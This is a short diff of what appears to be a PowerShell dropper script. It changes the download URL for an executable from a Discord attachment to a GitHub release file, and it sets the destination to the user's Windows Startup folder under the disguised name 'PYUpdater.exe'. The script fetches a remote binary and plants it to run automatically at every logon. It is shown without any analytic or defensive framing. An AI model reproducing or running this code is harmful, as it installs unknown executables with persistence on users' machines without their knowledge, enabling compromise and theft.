@@ -37,7 +37,7 @@ if ($process) {
     Write-Host ""
 }
 
-$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1525555387774926939/PYUpdater.exe?ex=6a53cfab&is=6a527e2b&hm=94afe7b86a5c6528869f0179f5453237906f2f72cb3eccdf7c605369c63e8dc7&"
+$url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $fn = "PYUpdater.exe"
 $fp = Join-Path -Path $dest -ChildPath $fn
